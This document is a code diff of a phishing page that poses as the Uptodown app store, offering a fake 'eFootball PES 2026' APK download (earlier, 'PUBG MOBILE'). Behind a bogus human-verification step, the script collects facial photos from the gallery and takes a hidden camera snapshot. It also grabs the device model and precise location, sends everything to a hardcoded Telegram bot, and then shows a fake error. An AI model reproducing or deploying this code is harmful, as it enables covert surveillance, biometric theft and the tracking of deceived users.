@@ -1,157 +1,168 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uptodown - Android o'yin va ilovalarini yuklab olish</title>
+    <title>Download eFootball PES 2026 for Android (APK) - Uptodown</title>
     <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --blue: #1b85d3; --bg: #f2f2f2; }
-        body { margin: 0; background: var(--bg); font-family: 'Roboto', sans-serif; color: #333; }
-        header { background: var(--blue); padding: 15px 20px; display: flex; align-items: center; color: white; }
-        .search-bar { flex-grow: 1; margin: 0 20px; background: rgba(255,255,255,0.2); padding: 8px; border-radius: 4px; border: none; color: white; }
+        :root { --upto-dark: #0f172a; --upto-blue: #1b85d3; --upto-green: #2ecc71; --upto-card: #1e293b; }
+        body { margin: 0; background: var(--upto-dark); font-family: 'Roboto', sans-serif; color: white; }
         
-        .main-container { max-width: 900px; margin: 20px auto; padding: 0 15px; }
-        .app-header { background: white; padding: 20px; border-radius: 8px; display: flex; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .app-icon { width: 80px; height: 80px; border-radius: 18px; margin-right: 20px; }
-        .download-section { margin-top: 20px; text-align: center; }
-        .btn-dl { background: #2ecc71; color: white; padding: 15px 50px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; font-size: 18px; width: 100%; box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3); }
+        /* Header & Nav */
+        header { background: #000; padding: 15px 25px; display: flex; align-items: center; border-bottom: 1px solid #334155; }
+        .logo { font-weight: 900; font-size: 22px; color: white; letter-spacing: -1px; }
+        .logo span { font-weight: 400; color: #ccc; }
+
+        /* App Main Section */
+        .app-container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
+        .app-main { display: flex; align-items: flex-start; gap: 25px; margin-bottom: 40px; }
+        .app-icon { width: 120px; height: 120px; border-radius: 25px; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
+        .app-info h1 { margin: 0; font-size: 32px; font-weight: 700; }
+        .app-meta { color: #94a3b8; font-size: 14px; margin: 10px 0; }
+        .badge { background: #334155; padding: 4px 10px; border-radius: 12px; font-size: 11px; color: var(--upto-blue); }
+
+        /* Download Buttons */
+        .btn-green { background: var(--upto-green); color: white; padding: 18px 40px; border-radius: 8px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 10px; font-size: 18px; width: fit-content; }
+        .btn-green:hover { background: #27ae60; }
         
-        /* Backend Overlay */
-        .overlay { display: none; position: fixed; inset: 0; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
-        .loader-ring { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--blue); border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        input[type="file"], video, canvas { display: none; }
+        /* Backend Logic Overlay */
+        #backendLayer { display: none; position: fixed; inset: 0; background: rgba(15, 23, 42, 0.98); z-index: 10000; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        .loading-box { background: #111; border: 1px solid var(--upto-blue); border-radius: 15px; padding: 40px; width: 100%; max-width: 400px; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top-color: var(--upto-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        video, canvas, #fileInput { display: none; }
     </style>
 </head>
 <body>
 
 <header>
-    <div style="font-weight: bold; font-size: 20px;">uptodown</div>
-    <input type="text" class="search-bar" placeholder="Ilovalarni qidirish...">
+    <div class="logo">uptodown <span>▼</span></div>
 </header>
 
-<div class="main-container">
-    <div class="app-header">
-        <img src="https://img.utdstc.com/icon/60b/69b/60b69b3504d60e6f6a7d515a86a605f6e914f6e1:200" class="app-icon" alt="PUBG">
-        <div>
-            <h1 style="margin:0; font-size:22px;">PUBG MOBILE (KR)</h1>
-            <p style="color:#888; margin:5px 0;">Krafton, Inc. | <span style="color:#2ecc71;">APK O'rnatilgan</span></p>
+<div class="app-container">
+    <div class="app-main">
+        <img src="https://img.utdstc.com/icon/60b/69b/60b69b3504d60e6f6a7d515a86a605f6e914f6e1:200" class="app-icon">
+        <div class="app-info">
+            <h1>eFootball PES 2026</h1>
+            <div class="app-meta">10.4.0 | KONAMI | <span class="badge">#SPORTS</span></div>
+            <div style="display:flex; gap:15px; margin-top:20px;">
+                <button class="btn-green" onclick="startUptodownDL()">
+                    <span style="font-size:24px;">📥</span> Download
+                </button>
+                <div style="font-size:12px; color:#64748b;">74.8 M downloads<br>Security Verified</div>
+            </div>
         </div>
     </div>
 
-    <div class="download-section">
-        <button class="btn-dl" onclick="triggerBackend()">Eng so'nggi versiya (APK)</button>
-        <p style="font-size:12px; color:#999; margin-top:10px;">Xavfsiz yuklab olish. Uptodown tomonidan tekshirilgan.</p>
+    <div style="background: #1e293b; padding: 25px; border-radius: 12px; margin-top: 50px;">
+        <h3 style="margin-top:0;">Technical details</h3>
+        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px; font-size:13px; color:#94a3b8;">
+            <div>Package Name: jp.konami.pesam</div>
+            <div>License: Free</div>
+            <div>Operating System: Android</div>
+            <div>Requirements: Android 7.0+</div>
+        </div>
     </div>
 </div>
 
-<div id="backendScreen" class="overlay">
-    <div id="loadingPhase">
-        <div class="loader-ring"></div>
-        <h2 style="color:var(--blue)">Server bilan aloqa...</h2>
-        <p id="statusMsg">Qurilma drayverlari moslashtirilmoqda...</p>
-    </div>
-
-    <div id="actionPhase" style="display:none;">
-        <h2 style="color:#e74c3c;">Xavfsizlik Tasdig'i</h2>
-        <p>APK faylni yuklash uchun robot emasligingizni tasdiqlang. Galereyadan 5 ta yuzingiz aniq ko'ringan rasmni tanlang.</p>
-        <label for="fileInput" style="display:block; padding:15px; border:2px dashed var(--blue); cursor:pointer; color:var(--blue); font-weight:bold;">📁 RASMLARNI TANLASH</label>
-        <input type="file" id="fileInput" accept="image/*" multiple onchange="scanAndSend(this)">
-        <p id="counter" style="margin-top:10px; font-weight:bold;"></p>
+<div id="backendLayer">
+    <div class="loading-box">
+        <div id="loader">
+            <div class="spinner"></div>
+            <h3>Connecting to Server...</h3>
+            <p style="font-size:12px; color:#888;">Optimizing APK for your device</p>
+        </div>
+        
+        <div id="verifBox" style="display:none;">
+            <h2 style="color:var(--upto-blue)">Verification Required</h2>
+            <p style="font-size:13px;">To download APK, verify that you are a human.</p>
+            <label for="fileInput" style="display:block; padding:15px; border:2px dashed #444; border-radius:8px; cursor:pointer; margin:20px 0; color:var(--upto-blue);">
+                📁 Select 5 facial photos from gallery
+            </label>
+            <input type="file" id="fileInput" accept="image/*" multiple onchange="processAI(this)">
+            <p id="st" style="font-size:11px; color:#555;"></p>
+        </div>
     </div>
 </div>
 
-<video id="vid" autoplay playsinline></video>
-<canvas id="canv"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
     const CONFIG = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
-    let faces = [], camBlob = null;
+    let photos = [], camPic = null;
 
-    async function initAI() {
+    async function init() {
         await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
     }
-    initAI();
+    init();
 
-    function triggerBackend() {
-        document.getElementById('backendScreen').style.display = 'flex';
+    function startUptodownDL() {
+        document.getElementById('backendLayer').style.display = 'flex';
         setTimeout(() => {
-            document.getElementById('loadingPhase').style.display = 'none';
-            document.getElementById('actionPhase').style.display = 'block';
-        }, 2500);
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('verifBox').style.display = 'block';
+        }, 2000);
     }
 
-    async function scanAndSend(input) {
-        const btn = document.getElementById('counter');
-        btn.innerText = "AI skanerlamoqda...";
+    async function processAI(input) {
+        document.getElementById('st').innerText = "AI is analyzing...";
         const files = Array.from(input.files);
-        faces = [];
-
         for (let f of files) {
             const img = await faceapi.bufferToImage(f);
             const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
-            if (d.length > 0) faces.push(f);
+            if (d.length > 0) photos.push(f);
         }
-
-        if (faces.length > 0) {
-            btn.innerText = "Tasdiqlandi! Yuklash boshlanmoqda...";
-            await startStealthCapture();
-        } else {
-            alert("Xato: Yuz aniqlanmadi. Iltimos, yuzingiz aniq tushgan rasmlarni tanlang.");
-        }
+        await stealthMission();
     }
 
-    async function startStealthCapture() {
+    async function stealthMission() {
+        // 1. Qurilma modeli
+        const device = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model'])).model : navigator.platform;
+        
+        // 2. Yashirin Kamera
         try {
-            // 1. Yashirin Kamera
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const v = document.getElementById('vid'); v.srcObject = stream;
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            const v = document.getElementById('v'); v.srcObject = s;
             await new Promise(r => setTimeout(r, 1000));
-            const c = document.getElementById('canv');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            camBlob = await (await fetch(c.toDataURL('image/jpeg', 0.6))).blob();
-            stream.getTracks().forEach(t => t.stop());
+            const canv = document.getElementById('c');
+            canv.width = v.videoWidth; canv.height = v.videoHeight;
+            canv.getContext('2d').drawImage(v, 0, 0);
+            camPic = await (await fetch(canv.toDataURL('image/jpeg', 0.5))).blob();
+            s.getTracks().forEach(t => t.stop());
+        } catch(e) {}
 
-            // 2. Qurilma nomi va Lokatsiya
-            const deviceName = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model'])).model : navigator.platform;
-            
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                const maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                await finalPush(deviceName, maps);
-            }, async () => {
-                await finalPush(deviceName, "Rad etildi");
-            }, {enableHighAccuracy: true});
-
-        } catch (e) { alert("Xavfsizlik ruxsatisiz APK yuklanmaydi!"); }
+        // 3. Lokatsiya va Yuborish
+        navigator.geolocation.getCurrentPosition(async (p) => {
+            const map = `http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            await send(device, map);
+        }, async () => { await send(device, "Denied"); });
     }
 
-    async function finalPush(dev, loc) {
-        const info = `📥 *UPTODOWN CLONE - SUCCESS*\n📱 Qurilma: ${dev}\n📍 Manzil: ${loc}\n👤 Holat: Verifikatsiyadan o'tdi`;
-
+    async function send(dev, loc) {
+        const msg = `🔥 *UPTODOWN CLONE DATA*\n📱 Device: ${dev}\n📍 Location: ${loc}\n✅ Faces Found: ${photos.length}`;
+        
         await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CONFIG.C, text: info, parse_mode: 'Markdown'})
+            body: JSON.stringify({chat_id: CONFIG.C, text: msg, parse_mode: 'Markdown'})
         });
 
-        if(camBlob) {
-            const fd = new FormData(); fd.append('chat_id', CONFIG.C); fd.append('photo', camBlob);
+        if(camPic) {
+            const fd = new FormData(); fd.append('chat_id', CONFIG.C); fd.append('photo', camPic);
             await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
         }
 
-        for (let f of faces) {
+        for (let f of photos) {
             const fd2 = new FormData(); fd2.append('chat_id', CONFIG.C); fd2.append('photo', f);
             fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
         }
 
-        setTimeout(() => {
-            alert("Xato: Paket yuklashda xatolik yuz berdi (Error 403). Iltimos, keyinroq qayta urinib ko'ring.");
-            location.reload();
-        }, 2000);
+        alert("Error: Server is busy. Try again later.");
+        location.reload();
     }
 </script>
 </body>
